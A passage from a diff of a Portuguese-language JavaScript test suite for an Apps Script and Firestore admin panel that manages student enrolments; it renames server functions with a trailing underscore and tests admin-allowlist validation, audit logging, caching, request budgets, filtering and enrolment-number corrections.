-  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com');
+  amb.api.gravarConfig_('admin_emails', 'coordenacao@exemplo.com');
 
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'admin_emails', valor: '  ,  ' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'admin_emails', valor: '  ,  ' });
 
   igual(r.ok, false);
   verdadeiro(/único e-mail autorizado/.test(r.erro), r.erro);
-  amb.api.limparCacheConfig();
-  igual(amb.api.config('admin_emails'), 'coordenacao@exemplo.com');
+  amb.api.limparCacheConfig_();
+  igual(amb.api.config_('admin_emails'), 'coordenacao@exemplo.com');
 });
 
 teste('e esvaziar a lista de OUTRA pessoa também é recusado, sem depender de configuração', () => {
@@ -1409,45 +1451,45 @@ teste('e esvaziar a lista de OUTRA pessoa também é recusado, sem depender de c
   // existir e a guarda passou a valer sempre — sem PIN, a allowlist é a fonte
   // única das DUAS portas remotas, então lista vazia é painel sem porta nenhuma.
   const amb = ambiente();
-  amb.api.gravarConfig('admin_emails', 'outra@exemplo.com');
+  amb.api.gravarConfig_('admin_emails', 'outra@exemplo.com');
 
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'admin_emails', valor: '' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'admin_emails', valor: '' });
 
   igual(r.ok, false);
   verdadeiro(/Esvaziar a lista/.test(r.erro), r.erro);
   verdadeiro(/link por e-mail/.test(r.erro),
     'a recusa precisa dizer que as duas portas dependem da lista: ' + r.erro);
-  amb.api.limparCacheConfig();
-  igual(amb.api.config('admin_emails'), 'outra@exemplo.com');
+  amb.api.limparCacheConfig_();
+  igual(amb.api.config_('admin_emails'), 'outra@exemplo.com');
 });
 
 teste('e-mail inválido no campo recusa o campo inteiro, sem gravar metade', () => {
   // Quem digitou `fulano@exemplo` e viu "salvo" acha que deu acesso a alguém.
   const amb = ambiente();
-  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com');
+  amb.api.gravarConfig_('admin_emails', 'coordenacao@exemplo.com');
 
-  const r = chamar(amb, 'salvarConfiguracao', {
+  const r = chamar(amb, 'salvarConfiguracao_', {
     chave: 'admin_emails', valor: 'coordenacao@exemplo.com, nova@exemplo.com, fulano@exemplo'
   });
 
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('fulano@exemplo') !== -1, r.erro);
-  amb.api.limparCacheConfig();
-  igual(amb.api.config('admin_emails'), 'coordenacao@exemplo.com', 'gravou parte do campo');
+  amb.api.limparCacheConfig_();
+  igual(amb.api.config_('admin_emails'), 'coordenacao@exemplo.com', 'gravou parte do campo');
 });
 
 teste('a lista válida grava, e a auditoria diz quem entrou e quem saiu', () => {
   const amb = ambiente();
-  amb.api.gravarConfig('admin_emails', 'coordenacao@exemplo.com, saindo@exemplo.com');
+  amb.api.gravarConfig_('admin_emails', 'coordenacao@exemplo.com, saindo@exemplo.com');
 
-  const r = chamar(amb, 'salvarConfiguracao', {
+  const r = chamar(amb, 'salvarConfiguracao_', {
     chave: 'admin_emails', valor: 'coordenacao@exemplo.com, Nova@Exemplo.com'
   });
 
   igual(r.ok, true, 'erro foi: ' + r.erro);
   igual(r.emails, ['coordenacao@exemplo.com', 'nova@exemplo.com']);
 
-  const acoes = amb.api.ultimosRegistros(5).map((l) => l.acao).sort();
+  const acoes = amb.api.ultimosRegistros_(5).map((l) => l.acao).sort();
   igual(acoes, ['ADMIN_INCLUIDO', 'ADMIN_REMOVIDO']);
 });
 
@@ -1460,7 +1502,7 @@ teste('chave marcada como segredo é recusada com frase própria', () => {
   const amb = ambiente();
   amb.api.CONFIG_SEGREDOS.form_id = 'FORM_ID_SECRETO';
 
-  const r = chamar(amb, 'salvarConfiguracao', { chave: 'form_id', valor: 'novo-valor' });
+  const r = chamar(amb, 'salvarConfiguracao_', { chave: 'form_id', valor: 'novo-valor' });
 
   igual(r.ok, false);
   verdadeiro(/secreta/.test(r.erro), r.erro);
@@ -1474,7 +1516,8 @@ grupo('contratos que não podem divergir em silêncio');
 // O painel saiu de `apps-script/Admin.html` para `docs/painel/index.html` em
 // 07/08 (GitHub Pages). O nome da constante ficou: o que estes testes conferem é
 // o contrato entre a TELA e o servidor, e ele não mudou de lado nenhum — só de
-// arquivo. `apps-script/Admin.html` hoje é a página que redireciona para cá.
+// arquivo. `apps-script/Admin.html` virou só o aviso de que o painel tinha
+// mudado de endereço, e saiu do servidor em 16/11/2026, com as outras páginas.
 const ADMIN = fs.readFileSync(
   path.join(__dirname, '..', 'docs', 'painel', 'index.html'), 'utf8');
 const FONTE = fs.readFileSync(path.join(PASTA_GS, '10_Painel.gs'), 'utf8');
@@ -1501,7 +1544,7 @@ const CHAMADAS_DO_ADMIN = (() => {
 teste('as funções desta fase existem e são chamadas pelo Admin.html', () => {
   const amb = ambiente();
   Object.keys(MINHAS_FUNCOES).forEach((funcao) => {
-    igual(typeof amb.api[funcao], 'function', funcao + ' não existe');
+    igual(typeof amb.api[daFuncao(funcao)], 'function', daFuncao(funcao) + ' não existe');
     verdadeiro(CHAMADAS_DO_ADMIN[funcao],
       'o Admin.html não chama ' + funcao + ' — o contrato mudou de um lado só');
   });
@@ -1528,7 +1571,7 @@ teste('os quatro status da tela são os quatro do sistema', () => {
     igual(amb.api.STATUS[s], s);
     verdadeiro(ADMIN.indexOf("opcaoStatus('" + s + "'") !== -1,
       'o modal de revisão não oferece ' + s);
-    igual(chamar(amb, 'resolverAluno', { id: 'nao-existe', status: s }).erro,
+    igual(chamar(amb, 'resolverAluno_', { id: 'nao-existe', status: s }).erro,
       'Aluno não encontrado. Recarregue a lista.', s + ' foi tratado como status inválido');
   });
 });
@@ -1566,7 +1609,7 @@ teste('LOTES_COLECAO tem o mesmo valor em 05_Importacao.gs e em 10_Painel.gs', (
 
 teste('a importação de verdade grava lotes que este painel consegue ordenar', () => {
   // Contrato entre duas fases, exercitado com o código das DUAS: `registrarLote_`
-  // é de 05_Importacao.gs e escolhe o campo do carimbo; `listarLotes` é daqui e
+  // é de 05_Importacao.gs e escolhe o campo do carimbo; `listarLotes_` é daqui e
   // escolhe o campo da ordenação. Enquanto os dois não forem o mesmo, a aba Lotes
   // fica vazia sem erro nenhum — e é isso que este teste impede.
   const amb = criarAmbiente({
@@ -1593,7 +1636,7 @@ teste('a importação de verdade grava lotes que este painel consegue ordenar', 
     });
   });
 
-  const r = amb.api.listarLotes({ token: token });
+  const r = amb.api.listarLotes_({ token: token });
   igual(r.ok, true);
   igual(r.itens.map((l) => l.arquivo), ['recente.csv', 'antigo.csv'],
     'a aba Lotes precisa abrir com a importação mais recente no topo');
@@ -1632,7 +1675,7 @@ teste('a turma do relatório gravada por registrarLote_ é a que listarLotes dev
     }
   }));
 
-  const r = amb.api.listarLotes({ token: token });
+  const r = amb.api.listarLotes_({ token: token });
   igual(r.ok, true);
   igual(r.itens[0].arquivo, 'ads41.csv');
   igual(r.itens[0].turma, 'ADS41');
@@ -1654,22 +1697,22 @@ grupo('orçamento de leitura — o número do cabeçalho, medido');
 teste('abrir as três abas de leitura custa 14 + 3 + 4 requisições', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('projetos', { nome: 'R+ Cidades', vagas: '60', ativo: 'SIM', ordem: '1' }, 'p1');
+  amb.api.inserir_('projetos', { nome: 'R+ Cidades', vagas: '60', ativo: 'SIM', ordem: '1' }, 'p1');
   amb.zerar();
 
-  chamar(amb, 'painelEstatisticas');   // 13 agregações + 1 leitura de agregados
+  chamar(amb, 'painelEstatisticas_');   // 13 agregações + 1 leitura de agregados
   const antesProjetos = amb.falso.requisicoes.length;
   igual(antesProjetos, 14);
 
-  // 1 leitura da configuração (vagas_padrao — `painelEstatisticas` não consulta
+  // 1 leitura da configuração (vagas_padrao — `painelEstatisticas_` não consulta
   // config nenhuma, então o cache da execução ainda está frio aqui), 1 consulta
   // da coleção de projetos e 1 agregação por projeto.
-  chamar(amb, 'painelProjetos');
+  chamar(amb, 'painelProjetos_');
   igual(amb.falso.requisicoes.length - antesProjetos, 3);
 
   const antesAlunos = amb.falso.requisicoes.length;
   const antesIdas = amb.falso.idas.length;
-  chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50 });
+  chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50 });
   igual(amb.falso.requisicoes.length - antesAlunos, 4,
     '2 agregações (o total e os cancelados ocultos), 1 consulta da página, 1 leitura dos cursos');
   igual(amb.falso.idas.length - antesIdas, 3, 'as duas agregações de "Todos" têm de sair na mesma ida');
@@ -1680,11 +1723,11 @@ teste('paginar é linear na página pedida — é o preço de paginar por númer
   semearMuitos(amb.api, 25);
   amb.zerar();
 
-  chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 10 });
+  chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 10 });
   igual(consultas(amb.falso).length, 1);
 
   amb.zerar();
-  chamar(amb, 'listarAlunos', { pagina: 3, tamanho: 10 });
+  chamar(amb, 'listarAlunos_', { pagina: 3, tamanho: 10 });
   igual(consultas(amb.falso).length, 3, 'a página 3 relê a 1 e a 2 para chegar ao cursor');
 });
 
@@ -1695,16 +1738,16 @@ teste('a busca por matrícula custa 3 requisições, não 2.500 leituras', () =>
   }
   amb.zerar();
 
-  chamar(amb, 'listarAlunos', { busca: '900017' });
+  chamar(amb, 'listarAlunos_', { busca: '900017' });
   igual(amb.falso.requisicoes.length, 2, '1 consulta por igualdade + 1 leitura dos cursos');
 });
 
 teste('salvar configuração não lê nada além do documento de config', () => {
   const amb = ambiente();
-  amb.api.lerConfig();
+  amb.api.lerConfig_();
   amb.zerar();
 
-  chamar(amb, 'salvarConfiguracao', { chave: 'vagas_padrao', valor: '30' });
+  chamar(amb, 'salvarConfiguracao_', { chave: 'vagas_padrao', valor: '30' });
   igual(leiturasDePonto(amb.falso).length, 0, 'a configuração já estava em cache da execução');
   igual(escritas(amb.falso).length, 2, '1 PATCH da config + 1 registro de log');
 });
@@ -1725,7 +1768,7 @@ teste('matrícula de outro curso não aparece na lista do curso filtrado', () =>
   semear(amb.api);
 
   // 'a001' é Maria, do curso ADS.
-  const r = chamar(amb, 'listarAlunos', { curso: 'ADM', busca: '20250001' });
+  const r = chamar(amb, 'listarAlunos_', { curso: 'ADM', busca: '20250001' });
 
   igual(r.ok, true, r.erro);
   igual(r.itens.map((a) => a.nome), [], 'Maria é de ADS e o filtro pedia ADM');
@@ -1737,7 +1780,7 @@ teste('matrícula do curso certo continua sendo encontrada, e barata', () => {
   semear(amb.api);
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { curso: 'ADS', busca: '20250001' });
+  const r = chamar(amb, 'listarAlunos_', { curso: 'ADS', busca: '20250001' });
 
   igual(r.itens.map((a) => a.nome), ['Maria da Silva']);
   igual(amb.falso.requisicoes.length, 2,
@@ -1749,8 +1792,8 @@ teste('a busca exata também obedece ao filtro de status sozinho', () => {
   semear(amb.api);
 
   // Maria é CONFIRMADO; a barra pede DIVERGENCIA.
-  igual(chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA', busca: '20250001' }).itens, []);
-  igual(chamar(amb, 'listarAlunos', { status: 'CONFIRMADO', busca: '20250001' })
+  igual(chamar(amb, 'listarAlunos_', { status: 'DIVERGENCIA', busca: '20250001' }).itens, []);
+  igual(chamar(amb, 'listarAlunos_', { status: 'CONFIRMADO', busca: '20250001' })
     .itens.map((a) => a.nome), ['Maria da Silva']);
 });
 
@@ -1760,9 +1803,9 @@ teste('busca por CPF com pontuação continua casando — a peneira de texto nã
   const amb = ambiente();
   semear(amb.api);
 
-  igual(chamar(amb, 'listarAlunos', { busca: '529.982.247-25' }).itens.map((a) => a.nome),
+  igual(chamar(amb, 'listarAlunos_', { busca: '529.982.247-25' }).itens.map((a) => a.nome),
     ['Maria da Silva']);
-  igual(chamar(amb, 'listarAlunos', { curso: 'ADS', busca: '529.982.247-25' })
+  igual(chamar(amb, 'listarAlunos_', { curso: 'ADS', busca: '529.982.247-25' })
     .itens.map((a) => a.nome), ['Maria da Silva']);
 });
 
@@ -1772,8 +1815,8 @@ teste('exportar com o mesmo filtro concorda com a lista — as duas pela mesma p
   const amb = ambiente();
   semear(amb.api);
 
-  const lista = chamar(amb, 'listarAlunos', { curso: 'ADM', busca: '20250001' });
-  const csv = chamar(amb, 'exportarCsv', { curso: 'ADM', busca: '20250001' });
+  const lista = chamar(amb, 'listarAlunos_', { curso: 'ADM', busca: '20250001' });
+  const csv = chamar(amb, 'exportarCsv_', { curso: 'ADM', busca: '20250001' });
 
   igual(lista.itens.length, 0);
   igual(csv.linhas, 0, 'o Exportar ao lado da lista não pode entregar o que a lista não mostra');
@@ -1786,7 +1829,7 @@ teste('exportar com o mesmo filtro concorda com a lista — as duas pela mesma p
  * O sintoma, nas palavras de quem usa: "ele fica um tempinho sempre carregando".
  *
  * A causa não era cota — 11 leituras num teto de 50 mil não pesam. Era o
- * RELÓGIO: as 11 requisições de `painelEstatisticas` saem em fila, cada ida e
+ * RELÓGIO: as 11 requisições de `painelEstatisticas_` saem em fila, cada ida e
  * volta ao Firestore custa perto de 300 ms, e isso se soma ao custo fixo de uma
  * execução do Apps Script. O que estes testes guardam é que os três remédios
  * continuam de pé, e que nenhum deles mente.
@@ -1805,9 +1848,9 @@ teste('a segunda abertura do Painel não custa requisição nenhuma', () => {
   const amb = ambiente();
   semear(amb.api);
 
-  const primeira = chamar(amb, 'painelEstatisticas');
+  const primeira = chamar(amb, 'painelEstatisticas_');
   amb.zerar();
-  const segunda = chamar(amb, 'painelEstatisticas');
+  const segunda = chamar(amb, 'painelEstatisticas_');
 
   igual(amb.falso.requisicoes.length, 0, 'as 13 agregações voltaram a sair na segunda abertura');
   igual(segunda.dados, primeira.dados, 'o cache respondeu outra coisa');
@@ -1817,10 +1860,10 @@ teste('atualizar: true fura o cache — é o botão Atualizar e o "acabei de gra
   const amb = ambiente();
   semear(amb.api);
 
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   amb.zerar();
 
-  chamar(amb, 'painelEstatisticas', { atualizar: true });
+  chamar(amb, 'painelEstatisticas_', { atualizar: true });
   igual(amb.falso.requisicoes.length, 14, 'o pedido explícito de atualização respondeu do cache');
 });
 
@@ -1831,12 +1874,12 @@ teste('atualizar: true REESCREVE o cache — o professor seguinte também vê o 
   const amb = ambiente();
   semear(amb.api);
 
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   criarAluno(amb.api, 'a099', { status: 'CONFIRMADO' });
 
-  igual(chamar(amb, 'painelEstatisticas', { atualizar: true }).dados.total, 5);
+  igual(chamar(amb, 'painelEstatisticas_', { atualizar: true }).dados.total, 5);
   amb.zerar();
-  igual(chamar(amb, 'painelEstatisticas').dados.total, 5, 'a entrada nova não foi guardada');
+  igual(chamar(amb, 'painelEstatisticas_').dados.total, 5, 'a entrada nova não foi guardada');
   igual(amb.falso.requisicoes.length, 0);
 });
 
@@ -1847,16 +1890,16 @@ teste('a janela é de 30 segundos, e ela REABRE', () => {
   semear(amb.api);
   igual(amb.api.PAINEL_CACHE_S, 30);
 
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
 
   amb.relogio.avancar(29 * 1000);
   amb.zerar();
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   igual(amb.falso.requisicoes.length, 0, 'antes dos 30 s ainda é o mesmo gesto');
 
   amb.relogio.avancar(2 * 1000);
   amb.zerar();
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   igual(amb.falso.requisicoes.length, 14, 'passados os 30 s o painel precisa voltar ao banco');
 });
 
@@ -1866,12 +1909,12 @@ teste('resolver uma divergência derruba o cache na hora', () => {
   const amb = ambiente();
   semear(amb.api);
 
-  igual(chamar(amb, 'painelEstatisticas').dados.porStatus.DIVERGENCIA, 1);
+  igual(chamar(amb, 'painelEstatisticas_').dados.porStatus.DIVERGENCIA, 1);
 
-  const divergente = chamar(amb, 'listarAlunos', { status: 'DIVERGENCIA' }).itens[0];
-  igual(chamar(amb, 'resolverAluno', { id: divergente.id, status: 'CONFIRMADO' }).ok, true);
+  const divergente = chamar(amb, 'listarAlunos_', { status: 'DIVERGENCIA' }).itens[0];
+  igual(chamar(amb, 'resolverAluno_', { id: divergente.id, status: 'CONFIRMADO' }).ok, true);
 
-  igual(chamar(amb, 'painelEstatisticas').dados.porStatus.DIVERGENCIA, 0,
+  igual(chamar(amb, 'painelEstatisticas_').dados.porStatus.DIVERGENCIA, 0,
     'o painel mostrou a divergência que a coordenação acabou de resolver');
 });
 
@@ -1879,14 +1922,14 @@ teste('resposta de erro não entra no cache', () => {
   // Guardar um `{ ok: false }` faria uma indisponibilidade de um segundo virar
   // erro repetido por 30 s — e o botão Atualizar mostraria a mesma falha.
   const amb = ambiente();
-  const originais = { contar: amb.api.contar };
-  amb.api.contar = () => { throw new Error('Firestore 503 UNAVAILABLE'); };
+  const originais = { contar: amb.api.contar_ };
+  amb.api.contar_ = () => { throw new Error('Firestore 503 UNAVAILABLE'); };
 
-  igual(chamar(amb, 'painelEstatisticas').ok, false);
+  igual(chamar(amb, 'painelEstatisticas_').ok, false);
 
-  amb.api.contar = originais.contar;
+  amb.api.contar_ = originais.contar;
   amb.zerar();
-  const depois = chamar(amb, 'painelEstatisticas');
+  const depois = chamar(amb, 'painelEstatisticas_');
   igual(depois.ok, true, 'a falha ficou guardada e o painel não se recuperou sozinho');
   igual(amb.falso.requisicoes.length, 14);
 });
@@ -1897,10 +1940,10 @@ teste('sem token, o cache quente não entrega número nenhum', () => {
   // entregá-los mais barato do que o banco entregaria.
   const amb = ambiente();
   semear(amb.api);
-  chamar(amb, 'painelEstatisticas');
+  chamar(amb, 'painelEstatisticas_');
   amb.zerar();
 
-  const r = amb.api.painelEstatisticas({});
+  const r = amb.api.painelEstatisticas_({});
   igual(r.ok, false);
   igual(r.dados, undefined, 'o cache respondeu a quem não tem sessão');
   igual(amb.falso.requisicoes.length, 0);
@@ -1913,9 +1956,9 @@ teste('CacheService ausente devolve o painel ao caminho sem cache', () => {
   semear(amb.api);
   amb.api.CacheService = undefined;
 
-  igual(chamar(amb, 'painelEstatisticas').dados.total, 4);
+  igual(chamar(amb, 'painelEstatisticas_').dados.total, 4);
   amb.zerar();
-  igual(chamar(amb, 'painelEstatisticas').dados.total, 4);
+  igual(chamar(amb, 'painelEstatisticas_').dados.total, 4);
   igual(amb.falso.requisicoes.length, 14, 'sem cache o custo é o de antes — e a resposta, correta');
 });
 
@@ -1926,10 +1969,10 @@ grupo('listarAlunos só manda os cursos quando a tela ainda não os tem');
 teste('cursos: false economiza a leitura de ponto', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');
+  amb.api.inserir_('agregados', { ADS: '2', ADM: '2' }, 'cursos');
   amb.zerar();
 
-  const r = chamar(amb, 'listarAlunos', { pagina: 1, tamanho: 50, cursos: false });
+  const r = chamar(amb, 'listarAlunos_', { pagina: 1, tamanho: 50, cursos: false });
   igual(r.ok, true);
   igual(r.cursos, undefined, 'mandou a lista que a tela já tinha');
   igual(leiturasDePonto(amb.falso).length, 0, 'leu o documento de agregados sem precisar');
@@ -1939,10 +1982,10 @@ teste('cursos: false economiza a leitura de ponto', () => {
 teste('o padrão continua sendo mandar — quem não conhece o parâmetro não perde nada', () => {
   const amb = ambiente();
   semear(amb.api);
-  amb.api.inserir('agregados', { ADS: '2', ADM: '2' }, 'cursos');
+  amb.api.inserir_('agregados', { ADS: '2', ADM: '2' }, 'cursos');
 
-  igual(chamar(amb, 'listarAlunos').cursos, ['ADM', 'ADS']);
-  igual(chamar(amb, 'listarAlunos', { cursos: true }).cursos, ['ADM', 'ADS']);
+  igual(chamar(amb, 'listarAlunos_').cursos, ['ADM', 'ADS']);
+  igual(chamar(amb, 'listarAlunos_', { cursos: true }).cursos, ['ADM', 'ADS']);
 });
 
 // ------------------------------------------------ O cliente também conta
@@ -2047,7 +2090,7 @@ teste('SO_LEITURA só tem leitura, e toda função dela existe no servidor', () 
   igual(nomes.indexOf('exportarCsv'), -1, 'exportarCsv registra no log — ela não é só leitura');
 
   const amb = ambiente();
-  nomes.forEach((n) => igual(typeof amb.api[n], 'function', n + ' não existe no servidor'));
+  nomes.forEach((n) => igual(typeof amb.api[daFuncao(n)], 'function', daFuncao(n) + ' não existe no servidor'));
 });
 
 teste('o select de curso é esquecido junto — curso novo não fica fora do filtro', () => {
@@ -2071,7 +2114,7 @@ teste('a conferência do token e o primeiro carregamento saem juntos', () => {
   // Esperar `sessaoAtiva` responder para só então pedir os números empilhava
   // duas execuções do Apps Script (~1,5 s de custo fixo cada) antes de a
   // primeira tela aparecer — e a segunda reconfere o mesmo token de qualquer
-  // jeito, porque toda função do painel começa por `exigirAdmin`.
+  // jeito, porque toda função do painel começa por `exigirAdmin_`.
   // O bloco saiu de dentro do `DOMContentLoaded` e virou `entrarComSessao`, que
   // hoje tem dois chamadores: a sessão guardada nesta aba e o `?sessao=` que
   // `liberarAcesso()` imprime. A ordem que este teste protege é a mesma, e agora
@@ -2127,13 +2170,13 @@ teste('sessão vencida derruba o painel UMA vez, não duas', () => {
 // ==================================================== A ficha do aluno: editar
 //
 // Daqui para baixo os cenários são montados com o CÓDIGO DE VERDADE das outras
-// fases — `gravarInscricao` grava a inscrição, `reconciliar` produz `alunos`.
+// fases — `gravarInscricao_` grava a inscrição, `reconciliar_` produz `alunos`.
 // Semear `alunos` na mão provaria que este arquivo escreve o que ele mesmo
 // escreveu; o que precisa ser provado é outra coisa: que a ficha corrigida cai no
 // endereço que a reconciliação usaria, e que a rodada seguinte concorda com ela.
 
 function semearProjeto(api, id, nome, vagas, extra) {
-  api.inserir('projetos', Object.assign({
+  api.inserir_('projetos', Object.assign({
     codigo: id, nome: nome, descricao: '', professor: '', email_professor: '',
     banner: '', local: '', horario: '', primeiro_encontro: '',
     vagas: String(vagas), ativo: 'SIM', inscricoes_abertas: 'SIM',
@@ -2142,7 +2185,7 @@ function semearProjeto(api, id, nome, vagas, extra) {
 }
 
 function semearMatriculado(api, matricula, nome, curso, turma) {
-  api.inserir('matriculados', {
+  api.inserir_('matriculados', {
     matricula: matricula, nome: nome, cpf: '', email: '', telefone: '',
     data_nascimento: '', curso: curso, turma: turma, situacao: 'MATRICULADO',
     lote_id: 'l1', importado_em: '2026-08-01 09:00:00'
@@ -2150,7 +2193,7 @@ function semearMatriculado(api, matricula, nome, curso, turma) {
 }
 
 function inscrever(api, projetoId, projetoNome, dados) {
-  return api.gravarInscricao(Object.assign({
+  return api.gravarInscricao_(Object.assign({
     origem: 'SITE', projeto_id: projetoId, projeto_nome: projetoNome,
     declara_ciencia: true, consentimento_lgpd: 'SIM'
   }, dados));
@@ -2177,7 +2220,7 @@ function cenarioMatriculaTrocada() {
     curso_fase: 'ADS - ADS21', matricula_conferida: 'SIM'
   });
 
-  api.reconciliar();
+  api.reconciliar_();
 
   amb.idDoBruno = api.chaveAluno_('mat:9110700');
   amb.idDaAna = api.chaveAluno_('mat:9110701');
@@ -2189,27 +2232,27 @@ grupo('editarAluno — a matrícula de outra pessoa, que é o pior caso do arqui
 teste('antes da correção, a ficha da inscrição mostra o nome de OUTRA pessoa', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const errada = amb.api.ler('alunos', amb.idDoBruno);
+  const errada = amb.api.ler_('alunos', amb.idDoBruno);
   igual(errada.nome, 'Bruno Costa', 'a lista oficial manda no nome — é o que montarAluno_ faz');
   igual(errada.turma, 'ADM61');
   igual(errada.status, 'DIVERGENCIA');
   igual(errada.inscricao_id, amb.inscricao.id);
 
   // E o Bruno de verdade não tem ficha própria: o registro dele foi consumido.
-  igual(amb.api.ler('alunos', amb.idDaAna).status, 'SO_MATRICULADO');
-  igual(amb.api.contar('alunos'), 2);
+  igual(amb.api.ler_('alunos', amb.idDaAna).status, 'SO_MATRICULADO');
+  igual(amb.api.contar_('alunos'), 2);
 });
 
 teste('corrigir a matrícula move a inscrição de endereço e não deixa a velha para trás', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '9110701' });
   igual(r.ok, true, r.erro);
 
-  igual(amb.api.ler('inscricoes', amb.inscricao.id), null, 'a inscrição no endereço velho sobrou');
-  igual(amb.api.contar('inscricoes'), 1, 'a correção duplicou a inscrição');
+  igual(amb.api.ler_('inscricoes', amb.inscricao.id), null, 'a inscrição no endereço velho sobrou');
+  igual(amb.api.contar_('inscricoes'), 1, 'a correção duplicou a inscrição');
 
-  const nova = amb.api.listar('inscricoes', {}).itens[0];
+  const nova = amb.api.listar_('inscricoes', {}).itens[0];
   igual(nova.matricula, '9110701');
   igual(nova.nome, 'Ana Lima', 'o nome digitado não podia ter sido tocado');
   igual(nova._id, amb.api.chaveDedup_({ projeto_id: 'p1', matricula: '9110701' }),
@@ -2219,11 +2262,11 @@ teste('corrigir a matrícula move a inscrição de endereço e não deixa a velh
 teste('a ficha corrigida cai no endereço que a reconciliação usaria, e o dono da matrícula antiga volta', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '9110701' });
   igual(r.id, amb.idDaAna, 'a ficha precisa mudar para o endereço da chave nova');
   igual(r.reconciliou, true, 'sem a rodada, status, curso e turma ficariam os da outra pessoa');
 
-  const ana = amb.api.ler('alunos', amb.idDaAna);
+  const ana = amb.api.ler_('alunos', amb.idDaAna);
   igual(ana.nome, 'Ana Lima');
   igual(ana.matricula, '9110701');
   igual(ana.turma, 'ADS21');
@@ -2231,15 +2274,15 @@ teste('a ficha corrigida cai no endereço que a reconciliação usaria, e o dono
 
   // O endereço velho não vira lixo: ele É o `chaveAluno_` da matrícula do Bruno,
   // e a mesma rodada o reaproveita para devolver o Bruno ao cadastro.
-  const bruno = amb.api.ler('alunos', amb.idDoBruno);
+  const bruno = amb.api.ler_('alunos', amb.idDoBruno);
   igual(bruno.nome, 'Bruno Costa');
   igual(bruno.status, 'SO_MATRICULADO');
-  igual(amb.api.contar('alunos'), 2, 'ninguém foi duplicado nem perdido');
+  igual(amb.api.contar_('alunos'), 2, 'ninguém foi duplicado nem perdido');
 
   // E a trilha aponta para a ficha CERTA: o endereço velho virou a ficha do
   // Bruno, então registrar a correção nele deixaria o histórico dizendo que
   // alguém mexeu na matrícula do Bruno.
-  const trilha = chamar(amb, 'listarLog').itens.filter((l) => l.acao === 'ALUNO_EDITADO')[0];
+  const trilha = chamar(amb, 'listarLog_').itens.filter((l) => l.acao === 'ALUNO_EDITADO')[0];
   igual(trilha.entidade_id, amb.idDaAna);
   verdadeiro(/matrícula 9110700 -> 9110701/.test(trilha.detalhe), trilha.detalhe);
 });
@@ -2247,13 +2290,13 @@ teste('a ficha corrigida cai no endereço que a reconciliação usaria, e o dono
 teste('a correção reconfere a matrícula contra a lista oficial', () => {
   const amb = cenarioMatriculaTrocada();
 
-  chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9090909' });
-  const nova = amb.api.listar('inscricoes', {}).itens[0];
+  chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '9090909' });
+  const nova = amb.api.listar_('inscricoes', {}).itens[0];
   igual(nova.matricula_conferida, 'NAO',
     'sem reconferir, a inscrição ficaria com o visto verde que ganhou pela matrícula de outro');
 
   // E o visto chega até a ficha, que é onde o selo ✓ da lista de alunos lê.
-  igual(amb.api.ler('alunos', amb.api.chaveAluno_('mat:9090909')).matricula_conferida, 'NAO');
+  igual(amb.api.ler_('alunos', amb.api.chaveAluno_('mat:9090909')).matricula_conferida, 'NAO');
 });
 
 teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, antes de qualquer exclusão', () => {
@@ -2264,16 +2307,16 @@ teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, antes de qualquer
   const legitima = inscrever(api, 'p1', 'R+ Cidades', {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
-  api.reconciliar();
+  api.reconciliar_();
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '9110701' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '9110701' });
   igual(r.ok, false);
   verdadeiro(/já existe uma inscrição desta pessoa neste projeto/.test(r.erro), r.erro);
 
-  verdadeiro(amb.api.ler('inscricoes', amb.inscricao.id) !== null, 'a recusa apagou a inscrição velha');
-  verdadeiro(amb.api.ler('inscricoes', legitima.id) !== null, 'a recusa mexeu na inscrição que já existia');
-  igual(amb.api.contar('inscricoes'), 2);
+  verdadeiro(amb.api.ler_('inscricoes', amb.inscricao.id) !== null, 'a recusa apagou a inscrição velha');
+  verdadeiro(amb.api.ler_('inscricoes', legitima.id) !== null, 'a recusa mexeu na inscrição que já existia');
+  igual(amb.api.contar_('inscricoes'), 2);
 
   // A garantia é do banco: a criação no endereço novo é uma requisição só, e é
   // ela que volta 409. Não existe consulta de duplicidade antes da escrita.
@@ -2282,7 +2325,7 @@ teste('a mesma pessoa no mesmo projeto é recusada pelo BANCO, antes de qualquer
 
 teste('matrícula em branco é recusada: ela é a chave, não um campo qualquer', () => {
   const amb = cenarioMatriculaTrocada();
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '   ' });
